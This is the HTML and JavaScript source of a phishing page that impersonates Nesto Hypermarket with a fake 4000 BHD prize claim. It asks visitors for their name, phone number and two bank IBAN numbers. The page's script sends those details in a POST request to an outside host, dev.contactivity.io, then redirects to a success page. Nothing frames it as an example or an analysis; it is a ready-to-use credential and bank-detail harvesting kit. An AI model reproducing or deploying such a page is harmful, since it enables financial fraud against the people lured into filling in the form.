<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prize Claim - Nesto Hypermarket</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f9f9f9;
            color: #444;
        }

        .container {
            max-width: 600px;
            margin: 20px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        header {
            text-align: center;
            margin-bottom: 20px;
        }

        header img {
            max-width: 200px;
            height: auto;
        }

        #prize-details form {
            max-width: 400px;
            margin: 0 auto;
        }

        #prize-details input,
        #prize-details button {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
        }

        #prize-details button {
            background-color: #007bff;
            color: #fff;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        #prize-details button:hover {
            background-color: #0056b3;
        }

        #prize-details input:focus,
        #prize-details button:focus {
            outline: none;
            border-color: #007bff;
        }

        ::placeholder {
            color: #999;
        }

        footer {
            text-align: center;
            margin-top: 20px;
        }

        footer p {
            margin: 0;
            font-size: 14px;
            color: #777;
        }

        #additional-info {
            text-align: center;
            margin-top: 20px;
        }

        #additional-info img {
            max-width: 100%;
            border-radius: 10px;
            margin-bottom: 10px;
        }

        #additional-info p {
            font-size: 16px;
            line-height: 1.6;
        }

        /* Loader Styles */
        .loader {
            display: none;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    
    <div class="container">
        <header>
            <img src="./logo.png" alt="Nesto Hypermarket Logo">
            <div id="additional-info">
                <img src="./img.webp" alt="Additional Image">
                <p>Congratulations! You've won a prize of 4000 BHD!</p>
                <p>To claim your prize, please fill out the form below and provide IBAN numbers.</p>
                <p>You must provide accounts to transfer the prize money.</p>
            </div>
            <h1>Prize Claim Form</h1>
        </header>

        <section id="prize-details">
            <form id="claim-form">
                <input type="text" id="name" placeholder="Your Full Name" required>
                <input type="tel" id="phone" placeholder="Your Phone Number" required>
                <input type="text" id="account1" placeholder="IBAN Number for Account 1" required>
                <input type="text" id="account2" placeholder="IBAN Number for Account 2" required>
                <button type="submit">Claim Prize</button>
                <div class="loader" id="loader"></div>
            </form>
        </section>
        <footer>
            &copy; 2024 Nesto Hypermarket. All rights reserved.
        </footer>

    </div>

    <script>
        document.getElementById('claim-form').addEventListener('submit', function (event) {
            event.preventDefault();

            // Show loader
            document.getElementById('loader').style.display = 'block';

            const name = document.getElementById('name').value;
            const phoneNumber = document.getElementById('phone').value;
            const account1 = document.getElementById('account1').value;
            const account2 = document.getElementById('account2').value;

            const formData = {
                name: name,
                phoneNumber: phoneNumber,
                account1: account1,
                account2: account2
            };

            fetch('https://dev.contactivity.io/send-email', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(formData)
            })
            .then(response => {
                if (response.ok) {
                    // Redirect to success page
                    window.location.href = 'success.html';
                } else {
                    // Hide loader if request fails
                    document.getElementById('loader').style.display = 'none';
                    alert('Failed to claim prize. Please try again.');
                }
            })
            .catch(error => {
                // Hide loader if request fails
                document.getElementById('loader').style.display = 'none';
                console.error('Error:', error);
                alert('Failed to claim prize. Please try again.');
            });
        });
    </script>
</body>
</html>
